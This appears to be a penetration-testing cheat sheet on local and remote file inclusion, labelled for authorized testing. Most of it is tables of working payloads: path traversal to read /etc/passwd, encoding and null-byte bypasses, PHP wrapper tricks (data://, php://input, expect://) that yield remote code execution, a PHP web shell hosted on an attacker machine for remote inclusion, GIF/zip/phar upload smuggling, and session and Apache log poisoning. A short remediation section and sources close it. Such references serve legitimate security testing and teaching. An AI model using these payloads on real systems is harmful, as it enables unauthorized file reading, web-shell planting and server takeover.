# LFI / RFI

> Local and Remote File Inclusion — read or execute attacker-supplied paths via user-controlled file references. Authorized testing only.

## TL;DR
- LFI = read/execute a server-side file via a path parameter (`?page=../../etc/passwd`).
- RFI = include a remote URL into a server-side include sink (now rare; depends on `allow_url_include=On` in PHP).
- Escalations: PHP wrappers (`php://filter`, `data://`, `expect://`), log poisoning, archive smuggling (`zip://`, `phar://`).
- CWE-22 Path Traversal, CWE-98 File Inclusion. Map: OWASP WSTG-INPV-11/12.

## Detection / Discovery
| Command | Description |
| --- | --- |
| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287` | Fuzz page parameters |
| `ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287` | Fuzz LFI payloads |
| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | Fuzz webroot path |
| `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287` | Fuzz server configurations |

Wordlists:
- LFI wordlists: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
- LFI-Jhaddix.txt: https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
- Linux webroots: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt
- Windows webroots: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt
- Linux LFI list (DragonJAR): https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
- Windows LFI list (DragonJAR): https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows

## Exploitation

### Basic LFI
| Payload | Description |
| --- | --- |
| `/index.php?language=/etc/passwd` | Direct absolute path |
| `/index.php?language=../../../../etc/passwd` | Path traversal |
| `/index.php?language=/../../../etc/passwd` | Leading-slash variant |
| `/index.php?language=./languages/../../../../etc/passwd` | Pass an "approved" prefix then escape |

### LFI Bypasses
| Payload | Description |
| --- | --- |
| `/index.php?language=....//....//....//....//etc/passwd` | Bypass naive `../` strip |
| `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | URL-encoded traversal |
| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Path truncation (obsolete on modern PHP) |
| `/index.php?language=../../../../etc/passwd%00` | Null-byte (PHP < 5.3.4 only) |
| `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read PHP source through filter |

### LFI → RCE

**PHP wrappers**
| Payload | Description |
| --- | --- |
| `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | RCE via `data://` (base64-encoded `<?php system($_GET["cmd"]); ?>`) |
| `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | RCE via `php://input` |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"` | RCE via `expect://` (requires PECL expect) |

**RFI**
| Payload | Description |
| --- | --- |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>` | Host attacker-side web shell |
| `/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id` | Include remote PHP web shell (needs `allow_url_include=On`) |

**LFI + Upload**
| Payload | Description |
| --- | --- |
| `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif` | Smuggle PHP inside fake GIF |
| `/index.php?language=./profile_images/shell.gif&cmd=id` | RCE via uploaded image |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php` | Zip smuggling |
| `/index.php?language=zip://shell.zip%23shell.php&cmd=id` | RCE via `zip://` wrapper |
| `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg` | Phar smuggling |
| `/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id` | RCE via `phar://` wrapper |

**Log poisoning**
| Payload | Description |
| --- | --- |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` | Read PHP session file |
| `/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` | Poison PHP session with web shell |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id` | RCE via poisoned session |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'` | Poison Apache access log via UA |
| `/index.php?language=/var/log/apache2/access.log&cmd=id` | RCE via poisoned log |

## File Inclusion Functions reference

| Function | Read Content | Execute | Remote URL |
| --- | :---: | :---: | :---: |
| **PHP** |
| `include()` / `include_once()` | ✅ | ✅ | ✅ |
| `require()` / `require_once()` | ✅ | ✅ | ❌ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()` / `file()` | ✅ | ❌ | ❌ |
| **NodeJS** |
| `fs.readFile()` | ✅ | ❌ | ❌ |
| `fs.sendFile()` | ✅ | ❌ | ❌ |
| `res.render()` | ✅ | ✅ | ❌ |
| **Java** |
| `include` | ✅ | ❌ | ❌ |
| `import` | ✅ | ✅ | ✅ |
| **.NET** |
| `@Html.Partial()` | ✅ | ❌ | ❌ |
| `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| `Response.WriteFile()` | ✅ | ❌ | ❌ |
| `include` | ✅ | ✅ | ✅ |

## Defence / Remediation
- **Never** concatenate user input into a file-loader argument. Use an indirect map: user supplies a key, server selects the file from an allow-list (CWE-22).
- PHP: set `allow_url_fopen=Off`, `allow_url_include=Off` (default since PHP 5.2). Disable `expect`, `phar` if not needed.
- Normalize paths with `realpath()` and assert the result is inside the intended base directory.
- Strict content-type & magic-byte checks on uploads; store uploads outside the document root and serve via a controlled endpoint.
- WAF rules for known wrappers (`php://`, `data://`, `expect://`, `phar://`, `zip://`) are a stop-gap, not a fix.

## Sources
- OWASP WSTG-INPV-11 Test for Local File Inclusion: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
- OWASP WSTG-INPV-12 Test for Remote File Inclusion: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion
- PortSwigger Path Traversal: https://portswigger.net/web-security/file-path-traversal
- PayloadsAllTheThings File Inclusion: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- HackTricks LFI / Path Traversal: https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html
